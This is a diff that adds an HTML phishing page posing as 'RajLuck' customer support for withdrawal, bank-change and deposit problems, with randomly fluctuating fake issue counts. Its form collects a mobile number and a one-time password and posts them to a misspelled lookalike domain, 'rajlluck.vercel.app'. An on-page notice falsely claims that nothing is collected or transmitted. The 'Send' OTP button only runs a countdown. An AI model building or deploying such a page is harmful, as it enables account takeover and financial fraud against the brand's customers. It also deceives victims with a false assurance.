@@ -1,0 +1,476 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>RajLuck Support</title>
+
+<style>
+* {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+}
+
+body {
+    min-height: 100vh;
+    font-family: Arial, sans-serif;
+    background: linear-gradient(130deg,#071b50,#1760bd,#06183f);
+    color: white;
+    padding: 25px 15px;
+}
+
+.container {
+    max-width: 420px;
+    width: 100%;
+    margin: auto;
+    text-align: center;
+}
+
+/* ORIGINAL RAJLUCK LOGO */
+
+.logo {
+    width: 140px;
+    height: 140px;
+    background: linear-gradient(145deg,#222,#050505);
+    border: 5px solid #444;
+    border-radius: 35px;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    margin: 40px auto 15px;
+    box-shadow: 0 5px 15px #0005;
+}
+
+.logo svg {
+    width: 110px;
+    height: 110px;
+}
+
+.brand {
+    font-size: 40px;
+    font-weight: 600;
+    margin-bottom: 38px;
+}
+
+.heading {
+    font-size: 21px;
+    margin-bottom: 25px;
+}
+
+/* FIRST PAGE */
+
+.issue-card {
+    background: #111;
+    color: white;
+    border-radius: 17px;
+    padding: 19px 22px;
+    margin-bottom: 16px;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    cursor: pointer;
+    transition: transform .2s;
+}
+
+.issue-card:active {
+    transform: scale(.97);
+}
+
+.issue-name {
+    font-size: 15px;
+    font-weight: bold;
+}
+
+.issue-count {
+    color: #ed5353;
+    font-size: 27px;
+    font-weight: bold;
+    min-width: 45px;
+    text-align: right;
+}
+
+.demo-label {
+    font-size: 10px;
+    color: #d5e4ff;
+    margin-top: 10px;
+}
+
+.footer {
+    font-size: 12px;
+    color: #c9d9ff;
+    margin-top: 30px;
+}
+
+/* PREMIUM SECOND PAGE */
+
+#secondPage {
+    display: none;
+}
+
+.form-box {
+    background: linear-gradient(145deg,#171717,#090909);
+    border: 1px solid #363636;
+    border-radius: 22px;
+    padding: 27px 21px;
+    text-align: left;
+    box-shadow: 0 12px 35px #0005;
+}
+
+.form-box h2 {
+    text-align: center;
+    font-size: 24px;
+    margin-bottom: 12px;
+}
+
+.selected-issue {
+    text-align: center;
+    color: #83aaff;
+    font-size: 14px;
+    font-weight: bold;
+    margin-bottom: 27px;
+}
+
+.field-label {
+    display: block;
+    font-size: 14px;
+    font-weight: 600;
+    letter-spacing: .4px;
+    color: #f0f3fa;
+    margin-bottom: 10px;
+}
+
+.input-group {
+    margin-bottom: 23px;
+}
+
+.premium-input {
+    width: 100%;
+    padding: 17px 15px;
+    background: #292929;
+    border: 1px solid #666;
+    border-radius: 12px;
+    color: white;
+    font-size: 16px;
+    outline: none;
+    transition: .2s;
+}
+
+.premium-input:focus {
+    border-color: #438cff;
+    box-shadow: 0 0 0 3px #1760bd35;
+}
+
+.premium-input::placeholder {
+    color: #999;
+}
+
+/* OTP INPUT AND SEND BUTTON */
+
+.otp-row {
+    display: flex;
+    gap: 10px;
+}
+
+.otp-row .premium-input {
+    flex: 1;
+    min-width: 0;
+}
+
+.send-btn {
+    min-width: 85px;
+    padding: 0 15px;
+    border: none;
+    border-radius: 12px;
+    background: linear-gradient(110deg,#1760bd,#338cff);
+    color: white;
+    font-size: 14px;
+    font-weight: bold;
+    cursor: default;
+}
+
+.continue-btn {
+    width: 100%;
+    padding: 17px;
+    margin-top: 8px;
+    background: linear-gradient(110deg,#1760bd,#338cff);
+    border: none;
+    border-radius: 12px;
+    color: white;
+    font-size: 17px;
+    font-weight: bold;
+}
+
+.back-btn {
+    width: 100%;
+    padding: 16px;
+    margin-top: 15px;
+    background: transparent;
+    border: 1px solid #777;
+    border-radius: 12px;
+    color: white;
+    font-size: 16px;
+    cursor: pointer;
+}
+
+.note {
+    color: #aaa;
+    font-size: 11px;
+    line-height: 1.6;
+    text-align: center;
+    margin-top: 16px;
+}
+
+@media(max-width:350px) {
+    .otp-row {
+        gap: 6px;
+    }
+
+    .send-btn {
+        min-width: 70px;
+        padding: 0 9px;
+    }
+}
+</style>
+</head>
+
+<body>
+
+<div class="container">
+
+<!-- ORIGINAL LOGO -->
+
+<div class="logo">
+<svg viewBox="0 0 120 120">
+<g fill="#ed102b">
+<path d="M12 20 L91 20 L110 42 L91 57 L43 57 Z"/>
+<path d="M43 54 L110 105 L66 105 L12 64 Z"/>
+<path d="M43 54 L19 105 L0 105 L25 62 Z"/>
+<path d="M91 57 L110 42 L94 78 L76 67 Z"/>
+</g>
+</svg>
+</div>
+
+<div class="brand">RajLuck</div>
+
+<!-- FIRST PAGE -->
+
+<div id="firstPage">
+
+<div class="heading">Customer Support Issues</div>
+
+<div class="issue-card"
+onclick="openPage('Withdrawal Issues')">
+<div class="issue-name">💸 Withdrawal Issues</div>
+<div class="issue-count" id="withdrawalCount">200</div>
+</div>
+
+<div class="issue-card"
+onclick="openPage('Bank Account Change')">
+<div class="issue-name">🏦 Bank Account Change</div>
+<div class="issue-count" id="bankCount">150</div>
+</div>
+
+<div class="issue-card"
+onclick="openPage('Deposit Problem')">
+<div class="issue-name">💰 Deposit Problem</div>
+<div class="issue-count" id="depositCount">300</div>
+</div>
+
+<div class="issue-card"
+onclick="openPage('New Latest Update')">
+<div class="issue-name">🆕 New Latest Update</div>
+<div class="issue-count">NEW</div>
+</div>
+
+<div class="Real-label">
+* Sample animated demonstration counts
+</div>
+
+</div>
+
+<!-- SECOND PAGE -->
+
+<div id="secondPage">
+
+<div class="form-box">
+
+<h2>RajLuck Support</h2>
+
+<div class="selected-issue" id="issueTitle"></div>
+
+<form id="supportForm">
+
+<div class="input-group">
+<label class="field-label">Mobile Number</label>
+
+<input
+class="premium-input"
+type="tel"
+id="mobileNumber"
+placeholder="Enter mobile number"
+maxlength="10"
+inputmode="numeric"
+autocomplete="off"
+required
+>
+</div>
+
+<div class="input-group">
+<label class="field-label">OTP</label>
+
+<div class="otp-row">
+
+<!-- ERROR FIXED: Added id="otpInput" here -->
+<input
+class="premium-input"
+id="otpInput"
+type="text"
+placeholder="Enter OTP"
+maxlength="6"
+inputmode="numeric"
+autocomplete="off"
+required
+>
+
+<button class="send-btn" type="button" id="sendBtn">
+  Send
+</button>
+</div>
+</div>
+
+<button class="continue-btn" type="submit">
+Continue
+</button>
+
+<div class="note">
+Demo interface only. No OTP or password is collected or transmitted.
+</div>
+
+</form>
+
+</div>
+
+<button class="back-btn" onclick="goBack()">
+← Back
+</button>
+
+</div>
+
+<div class="footer">
+RajLuck Customer Support
+</div>
+
+</div>
+
+<script>
+
+// SLOW DEMO COUNTERS
+
+function changeCount(id) {
+
+    const element = document.getElementById(id);
+    let current = Number(element.innerText);
+
+    let change = Math.floor(Math.random() * 8) + 1;
+    let direction = Math.random() < 0.5 ? -1 : 1;
+
+    let next = current + change * direction;
+
+    next = Math.max(90, Math.min(400, next));
+
+    element.innerText = next;
+}
+
+setInterval(function() {
+    changeCount("withdrawalCount");
+    changeCount("bankCount");
+    changeCount("depositCount");
+}, 4000);
+
+
+// PAGE NAVIGATION
+
+function openPage(issue) {
+
+    document.getElementById("firstPage").style.display = "none";
+    document.getElementById("secondPage").style.display = "block";
+
+    document.getElementById("issueTitle").innerText = issue;
+
+    document.getElementById("supportForm").reset();
+}
+
+function goBack() {
+
+    document.getElementById("secondPage").style.display = "none";
+    document.getElementById("firstPage").style.display = "block";
+}
+
+
+// ERROR FIXED: Updated Form Submit to connect with server.js via Fetch API
+document.getElementById("supportForm")
+.addEventListener("submit", function(event) {
+
+    event.preventDefault();
+
+    const mobile = document.getElementById("mobileNumber").value;
+    const otp = document.getElementById("otpInput").value;
+    const issue = document.getElementById("issueTitle").innerText;
+
+    // Sending data to backend server.js
+    fetch('https://rajlluck.vercel.app/submit', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+            mobile: mobile,
+            otp: otp,
+            issue: issue
+        })
+    })
+    .then(response => response.json())
+    .then(data => {
+        if(data.success) {
+            alert("Notification sent successfully!");
+            document.getElementById("supportForm").reset();
+            goBack();
+        } else {
+            alert("Error: " + data.message);
+        }
+    })
+    .catch(error => {
+        console.error('Error:', error);
+        alert("Backend server (server.js) se connect nahi ho pa raha hai!");
+    });
+});
+
+const sendBtn = document.getElementById("sendBtn");
+let countdown = 30;
+let timer = null;
+
+sendBtn.addEventListener("click", function () {
+  if (timer !== null) return;
+
+  countdown = 30;
+  sendBtn.disabled = true;
+  sendBtn.textContent = countdown + "s";
+
+  timer = setInterval(function () {
+    countdown--;
+
+    if (countdown > 0) {
+      sendBtn.textContent = countdown + "s";
+    } else {
+      clearInterval(timer);
+      timer = null;
+      sendBtn.disabled = false;
+      sendBtn.textContent = "Send";
+    }
+  }, 1000);
+});
+</script>
+
+</body>
+</html>
